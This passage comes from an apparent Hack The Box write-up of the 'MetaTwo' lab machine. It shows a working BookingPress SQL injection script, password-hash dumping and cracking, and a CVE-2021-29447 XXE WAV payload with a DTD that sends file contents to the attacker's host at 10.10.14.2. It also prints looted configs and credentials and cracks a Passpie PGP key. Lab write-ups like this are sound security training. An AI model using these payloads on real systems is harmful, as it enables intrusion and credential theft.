<span class="o">[{</span><span class="s2">&quot;bookingpress_service_id&quot;</span>:<span class="s2">&quot;10.5.15-MariaDB-0+deb11u1&quot;</span>,<span class="s2">&quot;bookingpress_category_id&quot;</span>:<span class="s2">&quot;Debian 11&quot;</span>,<span class="s2">&quot;bookingpress_service_name&quot;</span>:<span class="s2">&quot;debian-linux-gnu&quot;</span>,<span class="s2">&quot;bookingpress_service_price&quot;</span>:<span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">.00&quot;</span>,<span class="s2">&quot;bookingpress_service_duration_val&quot;</span>:<span class="s2">&quot;2&quot;</span>,<span class="s2">&quot;bookingpress_service_duration_unit&quot;</span>:<span class="s2">&quot;3&quot;</span>,<span class="s2">&quot;bookingpress_service_description&quot;</span>:<span class="s2">&quot;4&quot;</span>,<span class="s2">&quot;bookingpress_service_position&quot;</span>:<span class="s2">&quot;5&quot;</span>,<span class="s2">&quot;bookingpress_servicedate_created&quot;</span>:<span class="s2">&quot;6&quot;</span>,<span class="s2">&quot;service_price_without_currency&quot;</span>:1,<span class="s2">&quot;img_url&quot;</span>:<span class="s2">&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;</span><span class="o">}]</span>
</code></pre></div>
<p>It works! I wrote a little Python script to ease the injection process. I tried to enumerate the database a bit but could not found anything interesting, just the registered users and their hashes are worth it:</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://metapress.htb/wp-admin/admin-ajax.php&#39;</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Inject SQL: &#39;</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">sql</span> <span class="o">==</span> <span class="s1">&#39;exit&#39;</span><span class="p">):</span>
        <span class="k">break</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;bookingpress_front_get_category_services&#39;</span><span class="p">,</span>
        <span class="s1">&#39;_wpnonce&#39;</span><span class="p">:</span> <span class="s1">&#39;bf440717c1&#39;</span><span class="p">,</span>
        <span class="s1">&#39;category_id&#39;</span><span class="p">:</span> <span class="s1">&#39;33&#39;</span><span class="p">,</span>
        <span class="s1">&#39;total_service&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;-7502) UNION ALL SELECT 1,2,3,4,5,6,7,8,(</span><span class="si">{</span><span class="n">sql</span><span class="si">}</span><span class="s1">)-- -&#39;</span>
    <span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">):</span>
        <span class="n">json_response</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">json_response</span><span class="p">)):</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">json_response</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;bookingpress_servicedate_created&#39;</span><span class="p">])</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SQL error!&#39;</span><span class="p">)</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>Inject SQL: select group_concat(0x7c, user_login, 0x7c, user_pass, 0x7c) from wp_users
|admin|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|,|manager|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
</code></pre></div>
<p>Using John and the Rockyou dictionary I got the password for <code>manager</code> user: <code>partylikearockstar</code>. After login into the Wordpress dashboard, looks like the user has really low privileges. The only thing we can do is to upload media files but should be enough. The Wordpress version is vulnerable to <a href="https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/" target="_blank">CVE-2021-29447</a> so we should be able to exfiltrate files from the server. This is the payload I created following the article, the objective is to get the <code>/etc/passwd</code> file:</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>-en<span class="w"> </span><span class="s1">&#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;http://10.10.14.2:8080/evil.dtd&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.wav
</code></pre></div>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/HTB/MetaTwo<span class="o">(</span>TODO<span class="o">)</span>/www<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>evil.dtd<span class="w">               </span>
&lt;!ENTITY<span class="w"> </span>%<span class="w"> </span>file<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;
&lt;!ENTITY<span class="w"> </span>%<span class="w"> </span>init<span class="w"> </span><span class="s2">&quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.2:8080/?p=%file;&#39;&gt;&quot;</span><span class="w"> </span>&gt;
</code></pre></div>
<p>Uploading the payload with a web server hosting the <code>evil.dtd</code>, I got this request to my HTTP server:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/HTB/MetaTwo<span class="o">(</span>TODO<span class="o">)</span>/www<span class="o">]</span>
└─$<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span>
Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span><span class="w"> </span>...
<span class="m">10</span>.129.232.102<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">31</span>/Oct/2022<span class="w"> </span><span class="m">13</span>:16:21<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /evil.dtd HTTP/1.1&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
<span class="m">10</span>.129.232.102<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">31</span>/Oct/2022<span class="w"> </span><span class="m">13</span>:16:21<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
</code></pre></div>
<p>Decoding the base64 we get the <code>passwd</code> file of the machine so we can say that the exploit is working!</p>
<div class="highlight"><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
</code></pre></div>
<p>I did the same thing with the Nginx configuration file <code>/etc/nginx/nginx.conf</code> to search for the Wordpress root directory:</p>
<div class="highlight"><pre><span></span><code>user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    # server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    ##
    # Gzip Settings
    ##

    gzip on;

    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}


#mail {
#   # See sample authentication script at:
#   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#   # auth_http localhost/auth.php;
#   # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;
#   # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;
#
#   server {
#       listen     localhost:110;
#       protocol   pop3;
#       proxy      on;
#   }
#
#   server {
#       listen     localhost:143;
#       protocol   imap;
#       proxy      on;
#   }
#}
</code></pre></div>
<p>From the above file, I saw that <code>/etc/nginx/sites-enabled/default</code> was propably what I was looking for:</p>
<div class="highlight"><pre><span></span><code>server {

    listen 80;
    listen [::]:80;

    root /var/www/metapress.htb/blog;

    index index.php index.html;

        if ($http_host != &quot;metapress.htb&quot;) {
                rewrite ^ http://metapress.htb/;
        }

    location / {
        try_files $uri $uri/ /index.php?$args;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        expires max;
        log_not_found off;
    }

}
</code></pre></div>
<p>Now it is easy to find the Wordpress configuration file <code>/var/www/metapress.htb/blog/wp-config.php</code></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="sd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;blog&#39;</span> <span class="p">);</span>

<span class="sd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;blog&#39;</span> <span class="p">);</span>

<span class="sd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;635Aq@TdqrCwXFUZ&#39;</span> <span class="p">);</span>

<span class="sd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">);</span>

<span class="sd">/** Database Charset to use in creating database tables. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8mb4&#39;</span> <span class="p">);</span>

<span class="sd">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span> <span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FS_METHOD&#39;</span><span class="p">,</span> <span class="s1">&#39;ftpext&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FTP_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;metapress.htb&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FTP_PASS&#39;</span><span class="p">,</span> <span class="s1">&#39;9NYS_ii@FyL_p5M2NvJ&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FTP_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;ftp.metapress.htb&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FTP_BASE&#39;</span><span class="p">,</span> <span class="s1">&#39;blog/&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;FTP_SSL&#39;</span><span class="p">,</span> <span class="k">false</span> <span class="p">);</span>

<span class="sd">/**#@+</span>
<span class="sd"> * Authentication Unique Keys and Salts.</span>
<span class="sd"> * @since 2.6.0</span>
<span class="sd"> */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;AUTH_KEY&#39;</span><span class="p">,</span>         <span class="s1">&#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;SECURE_AUTH_KEY&#39;</span><span class="p">,</span>  <span class="s1">&#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;LOGGED_IN_KEY&#39;</span><span class="p">,</span>    <span class="s1">&#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;NONCE_KEY&#39;</span><span class="p">,</span>        <span class="s1">&#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;AUTH_SALT&#39;</span><span class="p">,</span>        <span class="s1">&#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;SECURE_AUTH_SALT&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;LOGGED_IN_SALT&#39;</span><span class="p">,</span>   <span class="s1">&#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39;</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;NONCE_SALT&#39;</span><span class="p">,</span>       <span class="s1">&#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39;</span> <span class="p">);</span>

<span class="sd">/**</span>
<span class="sd"> * WordPress Database Table prefix.</span>
<span class="sd"> */</span>
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>

<span class="sd">/**</span>
<span class="sd"> * For developers: WordPress debugging mode.</span>
<span class="sd"> * @link https://wordpress.org/support/article/debugging-in-wordpress/</span>
<span class="sd"> */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;WP_DEBUG&#39;</span><span class="p">,</span> <span class="k">false</span> <span class="p">);</span>

<span class="sd">/** Absolute path to the WordPress directory. */</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">defined</span><span class="p">(</span> <span class="s1">&#39;ABSPATH&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nb">define</span><span class="p">(</span> <span class="s1">&#39;ABSPATH&#39;</span><span class="p">,</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">);</span>
<span class="p">}</span>

<span class="sd">/** Sets up WordPress vars and included files. */</span>
<span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-settings.php&#39;</span><span class="p">;</span>
</code></pre></div>
<p>Some interesting things here, credentials for the database: <code>blog:635Aq@TdqrCwXFUZ</code> and credentials for the FTP server: <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code>. Now we can finally access the FTP server and start preparing a way into the machine.</p>
<h2 id="port-21">Port 21</h2>
<p>In the FTP server I can get access to all the Wordpress files but also to a directory called <code>mailer</code>. Looks like this is a PHP application that will be used to send messages to all the blog users, the interesting thing here is the file <code>send_email.php</code>. I found new credentials for what looks like a email server in port 587: <code>jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</code>.</p>
<p>I decided to try the credentials I just found to connect through SSH as the <code>jnelson</code> user and it worked! We are in the machine now!</p>
<h2 id="inside-the-machine-as-jnelson">Inside the machine as <code>jnelson</code></h2>
<p>After getting the flag I saw something interesting right away, a directory called <code>.passpie</code>. A quick Google search revealed that this folder is part of a password manager called <a href="https://github.com/marcwebbie/passpie" target="_blank">Passpie</a>. According with the <code>ssh</code> directory inside, looks like we could get the <code>root</code> password from here somehow:</p>
<div class="highlight"><pre><span></span><code>jnelson@meta2:~/.passpie/ssh$<span class="w"> </span>ls
jnelson.pass<span class="w">  </span>root.pass
</code></pre></div>
<div class="highlight"><pre><span></span><code>jnelson@meta2:~$<span class="w"> </span>passpie<span class="w"> </span>
╒════════╤═════════╤════════════╤═══════════╕
│<span class="w"> </span>Name<span class="w">   </span>│<span class="w"> </span>Login<span class="w">   </span>│<span class="w"> </span>Password<span class="w">   </span>│<span class="w"> </span>Comment<span class="w">   </span>│
╞════════╪═════════╪════════════╪═══════════╡
│<span class="w"> </span>ssh<span class="w">    </span>│<span class="w"> </span>jnelson<span class="w"> </span>│<span class="w"> </span>********<span class="w">   </span>│<span class="w">           </span>│
├────────┼─────────┼────────────┼───────────┤
│<span class="w"> </span>ssh<span class="w">    </span>│<span class="w"> </span>root<span class="w">    </span>│<span class="w"> </span>********<span class="w">   </span>│<span class="w">           </span>│
╘════════╧═════════╧════════════╧═══════════╛
</code></pre></div>
<h3 id="privilege-escalation">Privilege escalation</h3>
<p>Researching the documentation a bit, looks like it is possible to get the password using a master key. I found something interesting:</p>
<div class="highlight"><pre><span></span><code>jnelson@meta2:~/.passpie$<span class="w"> </span>ls<span class="w"> </span>-la
total<span class="w"> </span><span class="m">24</span>
dr-xr-x---<span class="w"> </span><span class="m">3</span><span class="w"> </span>jnelson<span class="w"> </span>jnelson<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">12</span>:52<span class="w"> </span>.
drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>jnelson<span class="w"> </span>jnelson<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">12</span>:53<span class="w"> </span>..
-r-xr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>jnelson<span class="w"> </span>jnelson<span class="w">    </span><span class="m">3</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">13</span>:57<span class="w"> </span>.config
-r-xr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>jnelson<span class="w"> </span>jnelson<span class="w"> </span><span class="m">5243</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">13</span>:58<span class="w"> </span>.keys
dr-xr-x---<span class="w"> </span><span class="m">2</span><span class="w"> </span>jnelson<span class="w"> </span>jnelson<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">12</span>:52<span class="w"> </span>ssh
</code></pre></div>
<p>That <code>.key</code> file contains both a private and a public PGP keys. Checking how this password manager works, looks like the private key is encrypted using a master password and then the passwords stored are encrypted using the public key. In order to decrypt the stored passwords, the user needs to enter the master password to decrypt the private key that allows the decryption of the information encrypted with the public key.</p>
<p>I copied the private key from the <code>.keys</code> file and using <code>gpg2john</code> and transfomed it into a hash that JohnTheRipper can understand. I just had to use the RockYou dictionary to get the master password <code>blink182</code>:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/HTB/MetaTwo<span class="o">(</span>TODO<span class="o">)</span>/passpie<span class="o">]</span>
└─$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>/home/kali/Wordlists/rockyou.txt<span class="w"> </span><span class="nb">hash</span><span class="w">                                             </span>
Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>gpg,<span class="w"> </span>OpenPGP<span class="w"> </span>/<span class="w"> </span>GnuPG<span class="w"> </span>Secret<span class="w"> </span>Key<span class="w"> </span><span class="o">[</span><span class="m">32</span>/64<span class="o">])</span>
Cost<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>s2k-count<span class="o">)</span><span class="w"> </span>is<span class="w"> </span><span class="m">65011712</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
Cost<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span><span class="nb">hash</span><span class="w"> </span>algorithm<span class="w"> </span><span class="o">[</span><span class="m">1</span>:MD5<span class="w"> </span><span class="m">2</span>:SHA1<span class="w"> </span><span class="m">3</span>:RIPEMD160<span class="w"> </span><span class="m">8</span>:SHA256<span class="w"> </span><span class="m">9</span>:SHA384<span class="w"> </span><span class="m">10</span>:SHA512<span class="w"> </span><span class="m">11</span>:SHA224<span class="o">])</span><span class="w"> </span>is<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
Cost<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>cipher<span class="w"> </span>algorithm<span class="w"> </span><span class="o">[</span><span class="m">1</span>:IDEA<span class="w"> </span><span class="m">2</span>:3DES<span class="w"> </span><span class="m">3</span>:CAST5<span class="w"> </span><span class="m">4</span>:Blowfish<span class="w"> </span><span class="m">7</span>:AES128<span class="w"> </span><span class="m">8</span>:AES192<span class="w"> </span><span class="m">9</span>:AES256<span class="w"> </span><span class="m">10</span>:Twofish<span class="w"> </span><span class="m">11</span>:Camellia128<span class="w"> </span><span class="m">12</span>:Camellia192<span class="w"> </span><span class="m">13</span>:Camellia256<span class="o">])</span><span class="w"> </span>is<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
Will<span class="w"> </span>run<span class="w"> </span><span class="m">8</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
blink182<span class="w">         </span><span class="o">(</span>Passpie<span class="o">)</span><span class="w">     </span>
1g<span class="w"> </span><span class="m">0</span>:00:00:01<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2022</span>-10-31<span class="w"> </span><span class="m">18</span>:36<span class="o">)</span><span class="w"> </span><span class="m">0</span>.5617g/s<span class="w"> </span><span class="m">94</span>.38p/s<span class="w"> </span><span class="m">94</span>.38c/s<span class="w"> </span><span class="m">94</span>.38C/s<span class="w"> </span>ginger..987654
